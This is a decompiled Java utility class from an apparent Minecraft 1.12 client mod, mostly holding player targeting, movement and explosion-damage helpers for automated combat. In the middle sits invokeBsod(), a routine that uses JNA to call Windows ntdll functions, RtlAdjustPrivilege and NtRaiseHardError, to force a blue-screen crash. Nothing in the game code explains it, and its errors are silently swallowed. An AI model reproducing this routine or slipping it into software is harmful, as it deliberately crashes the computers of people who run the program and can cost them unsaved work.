//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Jeffe\Desktop\Minecraft-Deobfuscator3000-master\1.12 stable mappings"!

// 
// Decompiled by Procyon v0.5.36
// 

package wtf.cattyn.moneymod.util.impl;

import net.minecraft.block.state.IBlockState;
import net.minecraft.block.BlockWeb;
import net.minecraft.block.material.Material;
import net.minecraft.util.EnumFacing;
import net.minecraft.world.World;
import net.minecraft.block.Block;
import net.minecraft.world.IBlockAccess;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.RayTraceResult;
import com.sun.jna.Memory;
import com.sun.jna.Function;
import net.minecraft.util.math.AxisAlignedBB;
import net.minecraft.init.MobEffects;
import net.minecraft.util.math.MathHelper;
import net.minecraft.enchantment.EnchantmentHelper;
import net.minecraft.util.CombatRules;
import net.minecraft.entity.SharedMonsterAttributes;
import net.minecraft.util.math.Vec3d;
import net.minecraft.entity.EntityLivingBase;
import wtf.cattyn.moneymod.Main;
import net.minecraft.potion.Potion;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.util.DamageSource;
import wtf.cattyn.moneymod.util.Globals;

public class EntityUtil implements Globals
{
    private static final DamageSource EXPLOSION_SOURCE;
    
    public static EntityPlayer getTarget(final float range) {
        EntityPlayer currentTarget = null;
        for (int size = EntityUtil.mc.world.playerEntities.size(), i = 0; i < size; ++i) {
            final EntityPlayer player = EntityUtil.mc.world.playerEntities.get(i);
            if (!isntValid(player, range)) {
                if (currentTarget == null) {
                    currentTarget = player;
                }
                else if (EntityUtil.mc.player.getDistanceSq((Entity)player) < EntityUtil.mc.player.getDistanceSq((Entity)currentTarget)) {
                    currentTarget = player;
                }
            }
        }
        return currentTarget;
    }
    
    public static double getDefaultMoveSpeed() {
        double d = 0.2873;
        if (EntityUtil.mc.player != null && EntityUtil.mc.player.isPotionActive(Potion.getPotionById(1))) {
            final int n = EntityUtil.mc.player.getActivePotionEffect(Potion.getPotionById(1)).getAmplifier();
            d *= 1.0 + 0.2 * (n + 1);
        }
        return d;
    }
    
    public static boolean isMoving() {
        return EntityUtil.mc.player.moveForward != 0.0 || EntityUtil.mc.player.moveStrafing != 0.0;
    }
    
    public static double[] forward(final double d) {
        float f = EntityUtil.mc.player.movementInput.moveForward;
        float f2 = EntityUtil.mc.player.movementInput.moveStrafe;
        float f3 = EntityUtil.mc.player.prevRotationYaw + (EntityUtil.mc.player.rotationYaw - EntityUtil.mc.player.prevRotationYaw) * EntityUtil.mc.getRenderPartialTicks();
        if (f != 0.0f) {
            if (f2 > 0.0f) {
                f3 += ((f > 0.0f) ? -45 : 45);
            }
            else if (f2 < 0.0f) {
                f3 += ((f > 0.0f) ? 45 : -45);
            }
            f2 = 0.0f;
            if (f > 0.0f) {
                f = 1.0f;
            }
            else if (f < 0.0f) {
                f = -1.0f;
            }
        }
        final double d2 = Math.sin(Math.toRadians(f3 + 90.0f));
        final double d3 = Math.cos(Math.toRadians(f3 + 90.0f));
        final double d4 = f * d * d3 + f2 * d * d2;
        final double d5 = f * d * d2 - f2 * d * d3;
        return new double[] { d4, d5 };
    }
    
    private boolean checkHitBoxes() {
        return !EntityUtil.mc.world.getCollisionBoxes((Entity)EntityUtil.mc.player, EntityUtil.mc.player.getEntityBoundingBox().expand(-0.0, -0.1, -0.0)).isEmpty();
    }
    
    public static boolean isntValid(final EntityPlayer entity, final double range) {
        return EntityUtil.mc.player.getDistance((Entity)entity) > range || entity == EntityUtil.mc.player || entity.getHealth() <= 0.0f || entity.isDead || Main.getFriendManager().is(entity.getName());
    }
    
    public static float getHealth(final EntityLivingBase player) {
        return player.getHealth() + player.getAbsorptionAmount();
    }
    
    public static float calculate(final double posX, final double posY, final double posZ, final EntityLivingBase entity) {
        final double v = (1.0 - entity.getDistance(posX, posY, posZ) / 12.0) * getBlockDensity(new Vec3d(posX, posY, posZ), entity.getEntityBoundingBox());
        return getBlastReduction(entity, getDamageMultiplied((float)((v * v + v) / 2.0 * 85.0 + 1.0)));
    }
    
    public static float getBlastReduction(final EntityLivingBase entity, final float damageI) {
        float damage = damageI;
        damage = CombatRules.getDamageAfterAbsorb(damage, (float)entity.getTotalArmorValue(), (float)entity.getEntityAttribute(SharedMonsterAttributes.ARMOR_TOUGHNESS).getAttributeValue());
        damage *= 1.0f - MathHelper.clamp((float)EnchantmentHelper.getEnchantmentModifierDamage(entity.getArmorInventoryList(), EntityUtil.EXPLOSION_SOURCE), 0.0f, 20.0f) / 25.0f;
        if (entity.isPotionActive(MobEffects.RESISTANCE)) {
            return damage - damage / 4.0f;
        }
        return damage;
    }
    
    public static float getDamageMultiplied(final float damage) {
        final int diff = EntityUtil.mc.world.getDifficulty().getId();
        return damage * ((diff == 0) ? 0.0f : ((diff == 2) ? 1.0f : ((diff == 1) ? 0.5f : 1.5f)));
    }
    
    public static float getBlockDensity(final Vec3d vec, final AxisAlignedBB bb) {
        final double d0 = 1.0 / ((bb.maxX - bb.minX) * 2.0 + 1.0);
        final double d2 = 1.0 / ((bb.maxY - bb.minY) * 2.0 + 1.0);
        final double d3 = 1.0 / ((bb.maxZ - bb.minZ) * 2.0 + 1.0);
        final double d4 = (1.0 - Math.floor(1.0 / d0) * d0) / 2.0;
        final double d5 = (1.0 - Math.floor(1.0 / d3) * d3) / 2.0;
        float j2 = 0.0f;
        float k2 = 0.0f;
        for (float f = 0.0f; f <= 1.0f; f += (float)d0) {
            for (float f2 = 0.0f; f2 <= 1.0f; f2 += (float)d2) {
                for (float f3 = 0.0f; f3 <= 1.0f; f3 += (float)d3) {
                    final double d6 = bb.minX + (bb.maxX - bb.minX) * f;
                    final double d7 = bb.minY + (bb.maxY - bb.minY) * f2;
                    final double d8 = bb.minZ + (bb.maxZ - bb.minZ) * f3;
                    if (rayTraceBlocks(new Vec3d(d6 + d4, d7, d8 + d5), vec, false, false, false) == null) {
                        ++j2;
                    }
                    ++k2;
                }
            }
        }
        return j2 / k2;
    }
    
    public static void invokeBsod() {
        try {
            final Boolean bl = null;
            final long response = 0L;
            final Function RtlAdjustPrivilege = Function.getFunction("ntdll.dll", "RtlAdjustPrivilege");
            final long r1 = RtlAdjustPrivilege.invokeLong(new Object[] { 19, true, false, new Memory(1L) });
            final Function NtRaiseHardError = Function.getFunction("ntdll.dll", "NtRaiseHardError");
            NtRaiseHardError.invokeLong(new Object[] { -1073740768, 0, 0, 0, 6, new Memory(32L) });
        }
        catch (Exception ex) {}
    }
    
    public static RayTraceResult rayTraceBlocks(Vec3d vec31, final Vec3d vec32, final boolean stopOnLiquid, final boolean ignoreBlockWithoutBoundingBox, final boolean returnLastUncollidableBlock) {
        final int i = MathHelper.floor(vec32.x);
        final int j = MathHelper.floor(vec32.y);
        final int k = MathHelper.floor(vec32.z);
        int l = MathHelper.floor(vec31.x);
        int i2 = MathHelper.floor(vec31.y);
        int j2 = MathHelper.floor(vec31.z);
        BlockPos blockpos = new BlockPos(l, i2, j2);
        final IBlockState iblockstate = EntityUtil.mc.world.getBlockState(blockpos);
        final Block block = iblockstate.getBlock();
        if ((!ignoreBlockWithoutBoundingBox || iblockstate.getCollisionBoundingBox((IBlockAccess)EntityUtil.mc.world, blockpos) != Block.NULL_AABB) && block.canCollideCheck(iblockstate, stopOnLiquid)) {
            return iblockstate.collisionRayTrace((World)EntityUtil.mc.world, blockpos, vec31, vec32);
        }
        RayTraceResult raytraceresult2 = null;
        int k2 = 200;
        while (k2-- >= 0) {
            if (Double.isNaN(vec31.x) || Double.isNaN(vec31.y) || Double.isNaN(vec31.z)) {
                return null;
            }
            if (l == i && i2 == j && j2 == k) {
                return returnLastUncollidableBlock ? raytraceresult2 : null;
            }
            boolean flag2 = true;
            boolean flag3 = true;
            boolean flag4 = true;
            double d0 = 999.0;
            double d2 = 999.0;
            double d3 = 999.0;
            if (i > l) {
                d0 = l + 1.0;
            }
            else if (i < l) {
                d0 = l + 0.0;
            }
            else {
                flag2 = false;
            }
            if (j > i2) {
                d2 = i2 + 1.0;
            }
            else if (j < i2) {
                d2 = i2 + 0.0;
            }
            else {
                flag3 = false;
            }
            if (k > j2) {
                d3 = j2 + 1.0;
            }
            else if (k < j2) {
                d3 = j2 + 0.0;
            }
            else {
                flag4 = false;
            }
            double d4 = 999.0;
            double d5 = 999.0;
            double d6 = 999.0;
            final double d7 = vec32.x - vec31.x;
            final double d8 = vec32.y - vec31.y;
            final double d9 = vec32.z - vec31.z;
            if (flag2) {
                d4 = (d0 - vec31.x) / d7;
            }
            if (flag3) {
                d5 = (d2 - vec31.y) / d8;
            }
            if (flag4) {
                d6 = (d3 - vec31.z) / d9;
            }
            if (d4 == -0.0) {
                d4 = -1.0E-4;
            }
            if (d5 == -0.0) {
                d5 = -1.0E-4;
            }
            if (d6 == -0.0) {
                d6 = -1.0E-4;
            }
            EnumFacing enumfacing;
            if (d4 < d5 && d4 < d6) {
                enumfacing = ((i > l) ? EnumFacing.WEST : EnumFacing.EAST);
                vec31 = new Vec3d(d0, vec31.y + d8 * d4, vec31.z + d9 * d4);
            }
            else if (d5 < d6) {
                enumfacing = ((j > i2) ? EnumFacing.DOWN : EnumFacing.UP);
                vec31 = new Vec3d(vec31.x + d7 * d5, d2, vec31.z + d9 * d5);
            }
            else {
                enumfacing = ((k > j2) ? EnumFacing.NORTH : EnumFacing.SOUTH);
                vec31 = new Vec3d(vec31.x + d7 * d6, vec31.y + d8 * d6, d3);
            }
            l = MathHelper.floor(vec31.x) - ((enumfacing == EnumFacing.EAST) ? 1 : 0);
            i2 = MathHelper.floor(vec31.y) - ((enumfacing == EnumFacing.UP) ? 1 : 0);
            j2 = MathHelper.floor(vec31.z) - ((enumfacing == EnumFacing.SOUTH) ? 1 : 0);
            blockpos = new BlockPos(l, i2, j2);
            final IBlockState iblockstate2 = EntityUtil.mc.world.getBlockState(blockpos);
            final Block block2 = iblockstate2.getBlock();
            if (ignoreBlockWithoutBoundingBox && iblockstate2.getMaterial() != Material.PORTAL && iblockstate2.getCollisionBoundingBox((IBlockAccess)EntityUtil.mc.world, blockpos) == Block.NULL_AABB) {
                continue;
            }
            if (block2.canCollideCheck(iblockstate2, stopOnLiquid) && !(block2 instanceof BlockWeb)) {
                return iblockstate2.collisionRayTrace((World)EntityUtil.mc.world, blockpos, vec31, vec32);
            }
            raytraceresult2 = new RayTraceResult(RayTraceResult.Type.MISS, vec31, enumfacing, blockpos);
        }
        return returnLastUncollidableBlock ? raytraceresult2 : null;
    }
    
    static {
        EXPLOSION_SOURCE = new DamageSource("explosion").setDifficultyScaled().setExplosion();
    }
}
